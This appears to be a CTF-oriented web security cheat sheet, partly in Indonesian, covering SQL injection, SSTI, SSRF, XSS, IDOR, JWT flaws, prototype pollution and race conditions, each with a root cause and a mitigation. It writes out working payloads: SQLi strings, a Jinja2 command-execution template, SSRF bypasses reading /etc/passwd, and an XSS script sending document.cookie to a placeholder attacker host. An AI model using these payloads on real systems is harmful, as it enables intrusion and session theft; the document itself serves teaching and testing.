# Web Vulnerabilities & Exploitation Patterns

> Domain: Web Application Security & CTF Web Exploitation
> Standard: OWASP Top 10 (2021/2025) & CWE Common Weakness Enumeration
> Classification: SECURITY KNOWLEDGE BASE

## Purpose

Panduan taksonomi celah keamanan web, pola eksploitasi di lab CTF, akar masalah kode, dan metode pengetesan.

---

## 1. Server-Side Injection Vulnerabilities

### A. SQL Injection (SQLi)
- **Root Cause:** String concatenation dalam query database tanpa parameterized statements/prepared queries.
- **Common Vectors:**
  - *Union-Based:* `' UNION SELECT 1, column_name, table_schema FROM information_schema.columns--`
  - *Boolean-Blind:* `' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--`
  - *Time-Blind:* `' OR IF(1=1, SLEEP(3), 0)--` (MySQL) atau `'; SELECT pg_sleep(3)--` (PostgreSQL)
  - *SQLite specifics:* `' UNION SELECT 1, tbl_name, sql FROM sqlite_master--`
- **Mitigation:** Gunakan Prepared Statements / Parameterized Queries / ORM parameterized binding.

### B. Server-Side Template Injection (SSTI)
- **Root Cause:** Input pengguna langsung di-render sebagai template string (Jinja2, Twig, EJS, Pebble) alih-alih di-pass sebagai data variable.
- **Detection Polyglot:** `{{7*7}}` $\to$ `49` atau `${7*7}` $\to$ `49` atau `<%= 7*7 %>` $\to$ `49`.
- **Engine Identification:**
  - `{{7*'7'}}` $\to$ `7777777` (Jinja2/Python)
  - `{{7*'7'}}` $\to$ `49` (Twig/PHP)
- **Jinja2 RCE Payload Pattern:**
  `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

### C. Server-Side Request Forgery (SSRF)
- **Root Cause:** Server melakukan HTTP request ke URL yang disuplai pengguna tanpa validasi IP/domain (mengakses `localhost`, `127.0.0.1`, cloud metadata `169.254.169.254`).
- **Bypass Techniques:**
  - Decimal IP: `http://2130706433/` (`127.0.0.1`)
  - IPv6 localhost: `http://[::1]/`
  - DNS Rebinding / Custom domain pointing to 127.0.0.1
  - URL schema switching: `file:///etc/passwd` atau `gopher://`

---

## 2. Client-Side & Authentication Flaws

### A. Cross-Site Scripting (XSS)
- **Types:**
  - *Reflected XSS:* Payload di-echo langsung dari request URL/query parameter.
  - *Stored XSS:* Payload tersimpan di database dan di-render ke browser pengguna lain.
  - *DOM XSS:* Manipulasi sink berbahaya (`innerHTML`, `document.write`, `eval`) via source (`location.hash`, `location.search`).
- **Cookie Stealing CTF Pattern (Headless Admin Bot):**
  `<script>fetch('http://attacker-ip:8000/?c=' + encodeURIComponent(document.cookie))</script>`
- **Mitigation:** Context-aware output encoding, strict Content Security Policy (CSP), `HttpOnly` cookie flags.

### B. Insecure Direct Object References (IDOR) & Broken Access Control
- **Root Cause:** Endpoint menerima identifier (`/api/users/102/invoice`) tanpa memverifikasi apakah user session yang aktif berhak mengakses objek tersebut.
- **Mitigation:** Object-level permission checks berbasis role & session user ID di layer backend.

### C. JSON Web Token (JWT) Exploits
- **Common CTF Flaws:**
  - *Algorithm None Attack:* Mengubah header `{"alg": "none"}` dan menghapus signature.
  - *Weak Secret Brute-Force:* Cracking HMAC secret menggunakan `hashcat` / `jwt-cracker` dictionary attack.
  - *Key Confusion (RS256 $\to$ HS256):* Menandatangani token dengan algoritma simetris HS256 menggunakan public key RSA server.
  - *JWK / JKU Injection:* Menyematkan key URL publik milik attacker dalam header token.

---

## 3. Advanced Logic & Architecture Bugs

### A. Prototype Pollution (Node.js / JavaScript)
- **Root Cause:** Recursive merge / clone object yang tidak aman memungkinkan manipulasi `__proto__` atau `constructor.prototype`.
- **Impact:** Mengubah default properties global object, memicu Denial of Service atau RCE via sub-process execution options (`shell`, `NODE_OPTIONS`).

### B. Race Conditions (Concurrency Flaws)
- **Root Cause:** Time-of-Check to Time-of-Use (TOCTOU) gap pada transaksi kredit, checkout diskon, atau voting.
- **Eksploitasi:** Mengirimkan puluhan HTTP request secara simultan menggunakan HTTP/2 single-packet attack / asynchronous parallel requests.
